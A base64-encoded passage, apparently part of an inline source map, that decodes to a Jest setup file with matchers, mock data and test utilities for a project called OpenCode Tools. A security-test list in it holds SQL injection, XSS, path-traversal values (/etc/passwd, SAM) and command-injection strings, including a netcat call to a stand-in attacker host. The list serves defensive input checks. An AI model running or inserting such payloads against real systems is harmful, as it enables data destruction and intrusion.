2YsQ0FBQyIsIm5hbWVzIjpbXSwic291cmNlcyI6WyIvYXBwL3Rlc3RzL3NldHVwL2plc3Quc2V0dXAudHMiXSwic291cmNlc0NvbnRlbnQiOlsiLyoqXG4gKiBKZXN0IFNldHVwIGFuZCBDb25maWd1cmF0aW9uXG4gKiBcbiAqIEdsb2JhbCB0ZXN0IHNldHVwLCB1dGlsaXRpZXMsIGFuZCBjb25maWd1cmF0aW9uIGZvciBPcGVuQ29kZSBUb29scyB0ZXN0IHN1aXRlXG4gKi9cblxuaW1wb3J0IHsgamVzdCB9IGZyb20gJ0BqZXN0L2dsb2JhbHMnO1xuaW1wb3J0ICogYXMgcGF0aCBmcm9tICdwYXRoJztcblxuLy8gPT09PT09PT09PT09PT09PT09PT1cbi8vIEdsb2JhbCBUZXN0IENvbmZpZ3VyYXRpb25cbi8vID09PT09PT09PT09PT09PT09PT09XG5cbi8vIE1vY2sgY29uc29sZSBtZXRob2RzIHRvIHJlZHVjZSBub2lzZSBpbiB0ZXN0c1xuY29uc3Qgb3JpZ2luYWxDb25zb2xlID0geyAuLi5jb25zb2xlIH07XG5cbmJlZm9yZUFsbCgoKSA9PiB7XG4gIC8vIFN1cHByZXNzIGNvbnNvbGUgb3V0cHV0IGR1cmluZyB0ZXN0cyB1bmxlc3MgZXhwbGljaXRseSBlbmFibGVkXG4gIGlmICghcHJvY2Vzcy5lbnYuVkVSQk9TRV9URVNUUykge1xuICAgIGdsb2JhbC5jb25zb2xlID0ge1xuICAgICAgLi4uY29uc29sZSxcbiAgICAgIGxvZzogamVzdC5mbigpLFxuICAgICAgd2FybjogamVzdC5mbigpLFxuICAgICAgZXJyb3I6IGplc3QuZm4oKSxcbiAgICB9O1xuICB9XG59KTtcblxuYWZ0ZXJBbGwoKCkgPT4ge1xuICAvLyBSZXN0b3JlIGNvbnNvbGUgbWV0aG9kc1xuICBnbG9iYWwuY29uc29sZSA9IG9yaWdpbmFsQ29uc29sZTtcbn0pO1xuXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuLy8gR2xvYmFsIFRlc3QgVXRpbGl0aWVzXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuXG4vLyBFeHRlbmQgSmVzdCBtYXRjaGVyc1xuZGVjbGFyZSBnbG9iYWwge1xuICBuYW1lc3BhY2UgamVzdCB7XG4gICAgaW50ZXJmYWNlIE1hdGNoZXJzPFI+IHtcbiAgICAgIHRvQmVWYWxpZFJlc2VhcmNoT3V0cHV0KCk6IFI7XG4gICAgICB0b0JlVmFsaWRVcmwoKTogUjtcbiAgICAgIHRvQmVWYWxpZEVtYWlsKCk6IFI7XG4gICAgICB0b0JlVmFsaWRJU09EYXRlKCk6IFI7XG4gICAgICB0b0JlQXJyYXlPZlZhbGlkU291cmNlcygpOiBSO1xuICAgIH1cbiAgfVxufVxuXG4vLyBDdXN0b20gbWF0Y2hlcnNcbmV4cGVjdC5leHRlbmQoe1xuICB0b0JlVmFsaWRSZXNlYXJjaE91dHB1dChyZWNlaXZlZCkge1xuICAgIGNvbnN0IHBhc3MgPSByZWNlaXZlZCAmJiBcbiAgICAgIHR5cGVvZiByZWNlaXZlZCA9PT0gJ29iamVjdCcgJiZcbiAgICAgIHJlY2VpdmVkLmRvc3NpZXIgJiZcbiAgICAgIHJlY2VpdmVkLnNvdXJjZXMgJiZcbiAgICAgIHJlY2VpdmVkLm1ldGEgJiZcbiAgICAgIHR5cGVvZiByZWNlaXZlZC5kb3NzaWVyLmNvbXBhbnlTdW1tYXJ5ID09PSAnc3RyaW5nJyAmJlxuICAgICAgQXJyYXkuaXNBcnJheShyZWNlaXZlZC5zb3VyY2VzKSAmJlxuICAgICAgdHlwZW9mIHJlY2VpdmVkLm1ldGEucnVuSWQgPT09ICdzdHJpbmcnO1xuXG4gICAgaWYgKHBhc3MpIHtcbiAgICAgIHJldHVybiB7XG4gICAgICAgIG1lc3NhZ2U6ICgpID0+IGBleHBlY3RlZCAke3JlY2VpdmVkfSBub3QgdG8gYmUgYSB2YWxpZCBSZXNlYXJjaE91dHB1dGAsXG4gICAgICAgIHBhc3M6IHRydWUsXG4gICAgICB9O1xuICAgIH0gZWxzZSB7XG4gICAgICByZXR1cm4ge1xuICAgICAgICBtZXNzYWdlOiAoKSA9PiBgZXhwZWN0ZWQgJHtyZWNlaXZlZH0gdG8gYmUgYSB2YWxpZCBSZXNlYXJjaE91dHB1dGAsXG4gICAgICAgIHBhc3M6IGZhbHNlLFxuICAgICAgfTtcbiAgICB9XG4gIH0sXG5cbiAgdG9CZVZhbGlkVXJsKHJlY2VpdmVkKSB7XG4gICAgdHJ5IHtcbiAgICAgIG5ldyBVUkwocmVjZWl2ZWQpO1xuICAgICAgcmV0dXJuIHtcbiAgICAgICAgbWVzc2FnZTogKCkgPT4gYGV4cGVjdGVkICR7cmVjZWl2ZWR9IG5vdCB0byBiZSBhIHZhbGlkIFVSTGAsXG4gICAgICAgIHBhc3M6IHRydWUsXG4gICAgICB9O1xuICAgIH0gY2F0Y2gge1xuICAgICAgcmV0dXJuIHtcbiAgICAgICAgbWVzc2FnZTogKCkgPT4gYGV4cGVjdGVkICR7cmVjZWl2ZWR9IHRvIGJlIGEgdmFsaWQgVVJMYCxcbiAgICAgICAgcGFzczogZmFsc2UsXG4gICAgICB9O1xuICAgIH1cbiAgfSxcblxuICB0b0JlVmFsaWRFbWFpbChyZWNlaXZlZCkge1xuICAgIGNvbnN0IGVtYWlsUmVnZXggPSAvXlteXFxzQF0rQFteXFxzQF0rXFwuW15cXHNAXSskLztcbiAgICBjb25zdCBwYXNzID0gZW1haWxSZWdleC50ZXN0KHJlY2VpdmVkKTtcbiAgICBcbiAgICBpZiAocGFzcykge1xuICAgICAgcmV0dXJuIHtcbiAgICAgICAgbWVzc2FnZTogKCkgPT4gYGV4cGVjdGVkICR7cmVjZWl2ZWR9IG5vdCB0byBiZSBhIHZhbGlkIGVtYWlsYCxcbiAgICAgICAgcGFzczogdHJ1ZSxcbiAgICAgIH07XG4gICAgfSBlbHNlIHtcbiAgICAgIHJldHVybiB7XG4gICAgICAgIG1lc3NhZ2U6ICgpID0+IGBleHBlY3RlZCAke3JlY2VpdmVkfSB0byBiZSBhIHZhbGlkIGVtYWlsYCxcbiAgICAgICAgcGFzczogZmFsc2UsXG4gICAgICB9O1xuICAgIH1cbiAgfSxcblxuICB0b0JlVmFsaWRJU09EYXRlKHJlY2VpdmVkKSB7XG4gICAgY29uc3QgaXNvRGF0ZVJlZ2V4ID0gL15cXGR7NH0tXFxkezJ9LVxcZHsyfVRcXGR7Mn06XFxkezJ9OlxcZHsyfVxcLlxcZHszfVokLztcbiAgICBjb25zdCBwYXNzID0gaXNvRGF0ZVJlZ2V4LnRlc3QocmVjZWl2ZWQpICYmICFpc05hTihEYXRlLnBhcnNlKHJlY2VpdmVkKSk7XG4gICAgXG4gICAgaWYgKHBhc3MpIHtcbiAgICAgIHJldHVybiB7XG4gICAgICAgIG1lc3NhZ2U6ICgpID0+IGBleHBlY3RlZCAke3JlY2VpdmVkfSBub3QgdG8gYmUgYSB2YWxpZCBJU08gZGF0ZWAsXG4gICAgICAgIHBhc3M6IHRydWUsXG4gICAgICB9O1xuICAgIH0gZWxzZSB7XG4gICAgICByZXR1cm4ge1xuICAgICAgICBtZXNzYWdlOiAoKSA9PiBgZXhwZWN0ZWQgJHtyZWNlaXZlZH0gdG8gYmUgYSB2YWxpZCBJU08gZGF0ZWAsXG4gICAgICAgIHBhc3M6IGZhbHNlLFxuICAgICAgfTtcbiAgICB9XG4gIH0sXG5cbiAgdG9CZUFycmF5T2ZWYWxpZFNvdXJjZXMocmVjZWl2ZWQpIHtcbiAgICBpZiAoIUFycmF5LmlzQXJyYXkocmVjZWl2ZWQpKSB7XG4gICAgICByZXR1cm4ge1xuICAgICAgICBtZXNzYWdlOiAoKSA9PiBgZXhwZWN0ZWQgJHtyZWNlaXZlZH0gdG8gYmUgYW4gYXJyYXlgLFxuICAgICAgICBwYXNzOiBmYWxzZSxcbiAgICAgIH07XG4gICAgfVxuXG4gICAgY29uc3QgdmFsaWRTb3VyY2VzID0gcmVjZWl2ZWQuZXZlcnkoc291cmNlID0+IFxuICAgICAgc291cmNlICYmXG4gICAgICB0eXBlb2Ygc291cmNlLnVybCA9PT0gJ3N0cmluZycgJiZcbiAgICAgIHR5cGVvZiBzb3VyY2UudGl0bGUgPT09ICdzdHJpbmcnICYmXG4gICAgICB0eXBlb2Ygc291cmNlLnJlbGV2YW5jZSA9PT0gJ3N0cmluZycgJiZcbiAgICAgIHR5cGVvZiBzb3VyY2UuYWNjZXNzZWRBdCA9PT0gJ3N0cmluZydcbiAgICApO1xuXG4gICAgaWYgKHZhbGlkU291cmNlcykge1xuICAgICAgcmV0dXJuIHtcbiAgICAgICAgbWVzc2FnZTogKCkgPT4gYGV4cGVjdGVkICR7cmVjZWl2ZWR9IG5vdCB0byBiZSBhbiBhcnJheSBvZiB2YWxpZCBzb3VyY2VzYCxcbiAgICAgICAgcGFzczogdHJ1ZSxcbiAgICAgIH07XG4gICAgfSBlbHNlIHtcbiAgICAgIHJldHVybiB7XG4gICAgICAgIG1lc3NhZ2U6ICgpID0+IGBleHBlY3RlZCAke3JlY2VpdmVkfSB0byBiZSBhbiBhcnJheSBvZiB2YWxpZCBzb3VyY2VzYCxcbiAgICAgICAgcGFzczogZmFsc2UsXG4gICAgICB9O1xuICAgIH1cbiAgfVxufSk7XG5cbi8vID09PT09PT09PT09PT09PT09PT09XG4vLyBHbG9iYWwgVGVzdCBEYXRhXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuXG5leHBvcnQgY29uc3QgZ2xvYmFsVGVzdERhdGEgPSB7XG4gIC8vIENvbW1vbiB0ZXN0IGNvbXBhbmllc1xuICBjb21wYW5pZXM6IHtcbiAgICB0ZWNoQ29ycDoge1xuICAgICAgbmFtZTogJ1RlY2hDb3JwJyxcbiAgICAgIGluZHVzdHJ5OiAnVGVjaG5vbG9neScsXG4gICAgICBkZXNjcmlwdGlvbjogJ0EgbGVhZGluZyB0ZWNobm9sb2d5IGNvbXBhbnkgc3BlY2lhbGl6aW5nIGluIGlubm92YXRpdmUgc29sdXRpb25zJyxcbiAgICAgIHNpemU6ICdFbnRlcnByaXNlJyxcbiAgICAgIGxvY2F0aW9uOiAnU2FuIEZyYW5jaXNjbywgQ0EnXG4gICAgfSxcbiAgICBzdGFydHVwWDoge1xuICAgICAgbmFtZTogJ1N0YXJ0dXBYJyxcbiAgICAgIGluZHVzdHJ5OiAnRmluVGVjaCcsXG4gICAgICBkZXNjcmlwdGlvbjogJ0FuIGlubm92YXRpdmUgZmludGVjaCBzdGFydHVwIGRpc3J1cHRpbmcgdHJhZGl0aW9uYWwgYmFua2luZycsXG4gICAgICBzaXplOiAnU3RhcnR1cCcsXG4gICAgICBsb2NhdGlvbjogJ0F1c3RpbiwgVFgnXG4gICAgfSxcbiAgICBoZWFsdGhUZWNoOiB7XG4gICAgICBuYW1lOiAnSGVhbHRoVGVjaCBTb2x1dGlvbnMnLFxuICAgICAgaW5kdXN0cnk6ICdIZWFsdGhjYXJlIFRlY2hub2xvZ3knLFxuICAgICAgZGVzY3JpcHRpb246ICdBSS1wb3dlcmVkIGhlYWx0aGNhcmUgc29sdXRpb25zIGZvciBpbXByb3ZlZCBwYXRpZW50IG91dGNvbWVzJyxcbiAgICAgIHNpemU6ICdNaWQtc2l6ZScsXG4gICAgICBsb2NhdGlvbjogJ0Jvc3RvbiwgTUEnXG4gICAgfVxuICB9LFxuXG4gIC8vIENvbW1vbiB0ZXN0IGluZHVzdHJpZXNcbiAgaW5kdXN0cmllczoge1xuICAgIGZpbnRlY2g6IHtcbiAgICAgIG5hbWU6ICdGaW5UZWNoJyxcbiAgICAgIGdyb3d0aDogJzE1JSBhbm51YWxseScsXG4gICAgICB0cmVuZHM6IFsnRGlnaXRhbCBwYXltZW50cycsICdBSSBmcmF1ZCBkZXRlY3Rpb24nLCAnTW9iaWxlLWZpcnN0JywgJ1JlZ1RlY2gnXSxcbiAgICAgIGNoYWxsZW5nZXM6IFsnUmVndWxhdG9yeSBjb21wbGlhbmNlJywgJ1NlY3VyaXR5IHRocmVhdHMnLCAnTGVnYWN5IHN5c3RlbXMnXVxuICAgIH0sXG4gICAgaGVhbHRoY2FyZToge1xuICAgICAgbmFtZTogJ0hlYWx0aGNhcmUgVGVjaG5vbG9neScsXG4gICAgICBncm93dGg6ICcxMiUgYW5udWFsbHknLFxuICAgICAgdHJlbmRzOiBbJ0FJIGRpYWdub3N0aWNzJywgJ1RlbGVtZWRpY2luZScsICdXZWFyYWJsZSBkZXZpY2VzJywgJ1BlcnNvbmFsaXplZCBtZWRpY2luZSddLFxuICAgICAgY2hhbGxlbmdlczogWydISVBBQSBjb21wbGlhbmNlJywgJ0ludGVncmF0aW9uIGNvbXBsZXhpdHknLCAnQ29zdCBwcmVzc3VyZXMnXVxuICAgIH0sXG4gICAgZWNvbW1lcmNlOiB7XG4gICAgICBuYW1lOiAnRS1jb21tZXJjZScsXG4gICAgICBncm93dGg6ICcxMCUgYW5udWFsbHknLFxuICAgICAgdHJlbmRzOiBbJ01vYmlsZSBjb21tZXJjZScsICdBSSBwZXJzb25hbGl6YXRpb24nLCAnU29jaWFsIGNvbW1lcmNlJywgJ1NhbWUtZGF5IGRlbGl2ZXJ5J10sXG4gICAgICBjaGFsbGVuZ2VzOiBbJ0N1c3RvbWVyIGFjcXVpc2l0aW9uJywgJ0xvZ2lzdGljcycsICdSZXR1cm5zIG1hbmFnZW1lbnQnXVxuICAgIH1cbiAgfSxcblxuICAvLyBDb21tb24gdGVjaG5vbG9neSBzdGFja3NcbiAgdGVjaFN0YWNrczoge1xuICAgIG1vZGVybjoge1xuICAgICAgZnJvbnRlbmQ6IFsnUmVhY3QnLCAnVnVlLmpzJywgJ0FuZ3VsYXInLCAnTmV4dC5qcycsICdTdmVsdGUnXSxcbiAgICAgIGJhY2tlbmQ6IFsnTm9kZS5qcycsICdQeXRob24nLCAnR28nLCAnSmF2YScsICdSdXN0J10sXG4gICAgICBkYXRhYmFzZTogWydQb3N0Z3JlU1FMJywgJ01vbmdvREInLCAnUmVkaXMnLCAnRWxhc3RpY3NlYXJjaCddLFxuICAgICAgaW5mcmFzdHJ1Y3R1cmU6IFsnQVdTJywgJ0RvY2tlcicsICdLdWJlcm5ldGVzJywgJ1RlcnJhZm9ybSddXG4gICAgfSxcbiAgICBsZWdhY3k6IHtcbiAgICAgIGZyb250ZW5kOiBbJ2pRdWVyeScsICdBbmd1bGFySlMnLCAnQmFja2JvbmUuanMnXSxcbiAgICAgIGJhY2tlbmQ6IFsnUEhQJywgJ1J1YnknLCAnSmF2YSBFRScsICcuTkVUIEZyYW1ld29yayddLFxuICAgICAgZGF0YWJhc2U6IFsnTXlTUUwnLCAnT3JhY2xlJywgJ1NRTCBTZXJ2ZXInXSxcbiAgICAgIGluZnJhc3RydWN0dXJlOiBbJ09uLXByZW1pc2UnLCAnVk13YXJlJywgJ1BoeXNpY2FsIHNlcnZlcnMnXVxuICAgIH1cbiAgfVxufTtcblxuLy8gPT09PT09PT09PT09PT09PT09PT1cbi8vIE1vY2sgVXRpbGl0aWVzXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuXG5leHBvcnQgY29uc3QgY3JlYXRlTW9ja0Z1bmN0aW9ucyA9IHtcbiAgLy8gTW9jayB3ZWJmZXRjaCByZXNwb25zZXNcbiAgd2ViZmV0Y2g6IHtcbiAgICBzdWNjZXNzOiAoY29udGVudDogc3RyaW5nID0gJ01vY2sgd2ViIGNvbnRlbnQgd2l0aCByZWxldmFudCBpbmZvcm1hdGlvbicpID0+IHtcbiAgICAgIHJldHVybiBqZXN0LmZuPGFueT4oKS5tb2NrUmVzb2x2ZWRWYWx1ZSh7XG4gICAgICAgIGNvbnRlbnQsXG4gICAgICAgIHVybDogJ2h0dHBzOi8vZXhhbXBsZS5jb20nLFxuICAgICAgICBzdWNjZXNzOiB0cnVlLFxuICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKVxuICAgICAgfSk7XG4gICAgfSxcblxuICAgIGZhaWx1cmU6IChlcnJvcjogc3RyaW5nID0gJ1NlcnZpY2UgdW5hdmFpbGFibGUnKSA9PiB7XG4gICAgICByZXR1cm4gamVzdC5mbjxhbnk+KCkubW9ja1JlamVjdGVkVmFsdWUobmV3IEVycm9yKGVycm9yKSk7XG4gICAgfSxcblxuICAgIHRpbWVvdXQ6IChkZWxheTogbnVtYmVyID0gNTAwMCkgPT4ge1xuICAgICAgcmV0dXJuIGplc3QuZm48YW55PigpLm1vY2tJbXBsZW1lbnRhdGlvbigoKSA9PiBcbiAgICAgICAgbmV3IFByb21pc2UoKF8sIHJlamVjdCkgPT4gXG4gICAgICAgICAgc2V0VGltZW91dCgoKSA9PiByZWplY3QobmV3IEVycm9yKCdSZXF1ZXN0IHRpbWVvdXQnKSksIGRlbGF5KVxuICAgICAgICApXG4gICAgICApO1xuICAgIH1cbiAgfSxcblxuICAvLyBNb2NrIGZpbGUgc3lzdGVtIG9wZXJhdGlvbnNcbiAgZmlsZXN5c3RlbToge1xuICAgIHJlYWRTdWNjZXNzOiAoY29udGVudDogc3RyaW5nKSA9PiB7XG4gICAgICByZXR1cm4gamVzdC5mbjxhbnk+KCkubW9ja1Jlc29sdmVkVmFsdWUoY29udGVudCk7XG4gICAgfSxcblxuICAgIHJlYWRGYWlsdXJlOiAoZXJyb3I6IHN0cmluZyA9ICdGaWxlIG5vdCBmb3VuZCcpID0+IHtcbiAgICAgIHJldHVybiBqZXN0LmZuPGFueT4oKS5tb2NrUmVqZWN0ZWRWYWx1ZShuZXcgRXJyb3IoZXJyb3IpKTtcbiAgICB9LFxuXG4gICAgd3JpdGVTdWNjZXNzOiAoKSA9PiB7XG4gICAgICByZXR1cm4gamVzdC5mbjxhbnk+KCkubW9ja1Jlc29sdmVkVmFsdWUodW5kZWZpbmVkKTtcbiAgICB9LFxuXG4gICAgd3JpdGVGYWlsdXJlOiAoZXJyb3I6IHN0cmluZyA9ICdQZXJtaXNzaW9uIGRlbmllZCcpID0+IHtcbiAgICAgIHJldHVybiBqZXN0LmZuPGFueT4oKS5tb2NrUmVqZWN0ZWRWYWx1ZShuZXcgRXJyb3IoZXJyb3IpKTtcbiAgICB9XG4gIH1cbn07XG5cbi8vID09PT09PT09PT09PT09PT09PT09XG4vLyBUZXN0IEVudmlyb25tZW50IFNldHVwXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuXG5leHBvcnQgY29uc3Qgc2V0dXBUZXN0RW52aXJvbm1lbnQgPSAoKSA9PiB7XG4gIC8vIFNldCB0ZXN0IGVudmlyb25tZW50IHZhcmlhYmxlc1xuICBwcm9jZXNzLmVudi5OT0RFX0VOViA9ICd0ZXN0JztcbiAgcHJvY2Vzcy5lbnYuVEVTVF9NT0RFID0gJ3RydWUnO1xuICBwcm9jZXNzLmVudi5MT0dfTEVWRUwgPSAnZXJyb3InOyAvLyBSZWR1Y2UgbG9nIG5vaXNlIGR1cmluZyB0ZXN0c1xuXG4gIC8vIE1vY2sgRGF0ZSBmb3IgY29uc2lzdGVudCB0aW1lc3RhbXBzIGluIHRlc3RzXG4gIGNvbnN0IG1vY2tEYXRlID0gbmV3IERhdGUoJzIwMjQtMDEtMDFUMDA6MDA6MDAuMDAwWicpO1xuICBcbiAgLy8gRW5zdXJlIGNsZWFuIHN0YXRlXG4gIGplc3QuY2xlYXJBbGxUaW1lcnMoKTtcbiAgamVzdC51c2VGYWtlVGltZXJzKCk7XG4gIGplc3Quc2V0U3lzdGVtVGltZShtb2NrRGF0ZSk7XG59O1xuXG5leHBvcnQgY29uc3QgY2xlYW51cFRlc3RFbnZpcm9ubWVudCA9ICgpID0+IHtcbiAgLy8gUmVzdG9yZSByZWFsIHRpbWVyc1xuICBqZXN0LnVzZVJlYWxUaW1lcnMoKTtcbiAgXG4gIC8vIENsZWFyIGFsbCBtb2Nrc1xuICBqZXN0LmNsZWFyQWxsTW9ja3MoKTtcbiAgamVzdC5yZXN0b3JlQWxsTW9ja3MoKTtcbiAgXG4gIC8vIFJlc2V0IGVudmlyb25tZW50XG4gIGRlbGV0ZSBwcm9jZXNzLmVudi5URVNUX01PREU7XG59O1xuXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuLy8gUGVyZm9ybWFuY2UgVGVzdGluZyBVdGlsaXRpZXNcbi8vID09PT09PT09PT09PT09PT09PT09XG5cbmV4cG9ydCBjb25zdCBwZXJmb3JtYW5jZVV0aWxzID0ge1xuICBtZWFzdXJlRXhlY3V0aW9uVGltZTogYXN5bmMgKGZuOiAoKSA9PiBQcm9taXNlPGFueT4pOiBQcm9taXNlPHsgcmVzdWx0OiBhbnk7IGR1cmF0aW9uOiBudW1iZXIgfT4gPT4ge1xuICAgIGNvbnN0IHN0YXJ0ID0gcHJvY2Vzcy5ocnRpbWUuYmlnaW50KCk7XG4gICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgZm4oKTtcbiAgICBjb25zdCBlbmQgPSBwcm9jZXNzLmhydGltZS5iaWdpbnQoKTtcbiAgICBjb25zdCBkdXJhdGlvbiA9IE51bWJlcihlbmQgLSBzdGFydCkgLyAxXzAwMF8wMDA7IC8vIENvbnZlcnQgdG8gbWlsbGlzZWNvbmRzXG4gICAgXG4gICAgcmV0dXJuIHsgcmVzdWx0LCBkdXJhdGlvbiB9O1xuICB9LFxuXG4gIGFzc2VydFBlcmZvcm1hbmNlOiAoZHVyYXRpb246IG51bWJlciwgbWF4RHVyYXRpb246IG51bWJlciA9IDEwMDApID0+IHtcbiAgICBleHBlY3QoZHVyYXRpb24pLnRvQmVMZXNzVGhhbihtYXhEdXJhdGlvbik7XG4gIH1cbn07XG5cbi8vID09PT09PT09PT09PT09PT09PT09XG4vLyBTZWN1cml0eSBUZXN0aW5nIFV0aWxpdGllc1xuLy8gPT09PT09PT09PT09PT09PT09PT1cblxuZXhwb3J0IGNvbnN0IHNlY3VyaXR5VGVzdFV0aWxzID0ge1xuICAvLyBDb21tb24gYXR0YWNrIHZlY3RvcnMgZm9yIHRlc3RpbmdcbiAgYXR0YWNrVmVjdG9yczoge1xuICAgIHNxbEluamVjdGlvbjogW1xuICAgICAgXCInOyBEUk9QIFRBQkxFIHVzZXJzOyAtLVwiLFxuICAgICAgXCInIE9SICcxJz0nMVwiLFxuICAgICAgXCInOyBJTlNFUlQgSU5UTyB1c2VycyBWQUxVRVMgKCdoYWNrZXInLCAncGFzc3dvcmQnKTsgLS1cIlxuICAgIF0sXG4gICAgeHNzOiBbXG4gICAgICAnPHNjcmlwdD5hbGVydChcIlhTU1wiKTwvc2NyaXB0PicsXG4gICAgICAnamF2YXNjcmlwdDphbGVydChcIlhTU1wiKScsXG4gICAgICAnPGltZyBzcmM9XCJ4XCIgb25lcnJvcj1cImFsZXJ0KFxcJ1hTU1xcJylcIj4nXG4gICAgXSxcbiAgICBwYXRoVHJhdmVyc2FsOiBbXG4gICAgICAnLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgICAnLi5cXFxcLi5cXFxcLi5cXFxcd2luZG93c1xcXFxzeXN0ZW0zMlxcXFxjb25maWdcXFxcc2FtJyxcbiAgICAgICcvZXRjL3Bhc3N3ZCdcbiAgICBdLFxuICAgIGNvbW1hbmRJbmplY3Rpb246IFtcbiAgICAgICc7IGNhdCAvZXRjL3Bhc3N3ZCcsXG4gICAgICAnJiYgd2hvYW1pJyxcbiAgICAgICd8IG5jIGF0dGFja2VyLmNvbSA0NDQ0J1xuICAgIF1cbiAgfSxcblxuICAvLyBUZXN0IGZvciBjb21tb24gdnVsbmVyYWJpbGl0aWVzXG4gIHRlc3RGb3JWdWxuZXJhYmlsaXRpZXMoaW5wdXQ6IHN0cmluZywgdnVsbmVyYWJpbGl0eVR5cGU6IHN0cmluZykge1xuICAgIC8vIEB0cy1pZ25vcmVcbiAgICBjb25zdCB2ZWN0b3JzID0gdGhpcy5hdHRhY2tWZWN0b3JzW3Z1bG5lcmFiaWxpdHlUeXBlIGFzIGtleW9mIHR5cGVvZiB0aGlzLmF0dGFja1ZlY3RvcnNdIHx8IFtdO1xuICAgIC8vIEB0cy1pZ25vcmVcbiAgICByZXR1cm4gdmVjdG9ycy5zb21lKHZlY3RvciA9PiBpbnB1dC5pbmNsdWRlcyh2ZWN0b3IpKTtcbiAgfVxufTtcblxuLy8gPT09PT09PT09PT09PT09PT09PT1cbi8vIFRlc3QgTGlmZWN5Y2xlIEhvb2tzXG4vLyA9PT09PT09PT09PT09PT09PT09PVxuXG5iZWZvcmVFYWNoKCgpID0+IHtcbiAgLy8gUmVzZXQgYWxsIG1vY2tzIGJlZm9yZSBlYWNoIHRlc3RcbiAgamVzdC5jbGVhckFsbE1vY2tzKCk7XG4gIFxuICAvLyBTZXR1cCBmcmVzaCB0ZXN0IGVudmlyb25tZW50XG4gIHNldHVwVGVzdEVudmlyb25tZW50KCk7XG59KTtcblxuYWZ0ZXJFYWNoKCgpID0+IHtcbiAgLy8gQ2xlYW51cCBhZnRlciBlYWNoIHRlc3RcbiAgY2xlYW51cFRlc3RFbnZpcm9ubWVudCgpO1xufSk7XG5cbmJlZm9yZUFsbCgoKSA9PiB7XG4gIC8vIEdsb2JhbCBzZXR1cCBmb3IgYWxsIHRlc3RzXG4gIGNvbnNvbGUubG9nKCfwn6eqIFNldHRpbmcgdXAgT3BlbkNvZGUgVG9vbHMgdGVzdCBlbnZpcm9ubWVudC4uLicpO1xuICBzZXR1cFRlc3RFbnZpcm9ubWVudCgpO1xufSk7XG5cbmFmdGVyQWxsKCgpID0+IHtcbiAgLy8gR2xvYmFsIGNsZWFudXAgZm9yIGFsbCB0ZXN0c1xuICBjb25zb2xlLmxvZygn4pyFIENsZWFuaW5nIHVwIE9wZW5Db2RlIFRvb2xzIHRlc3QgZW52aXJvbm1lbnQuLi4nKTtcbiAgY2xlYW51cFRlc3RFbnZpcm9ubWVudCgpO1xufSk7XG5cbmV4cG9ydCBkZWZhdWx0IHtcbiAgc2V0dXBUZXN0RW52aXJvbm1lbnQsXG4gIGNsZWFudXBUZXN0RW52aXJvbm1lbnQsXG4gIGNyZWF0ZU1vY2tGdW5jdGlvbnMsXG4gIHBlcmZvcm1hbmNlVXRpbHMsXG4gIHNlY3VyaXR5VGVzdFV0aWxzLFxuICBnbG9iYWxUZXN0RGF0YVxufTtcbiJdLCJ2ZXJzaW9uIjozfQ==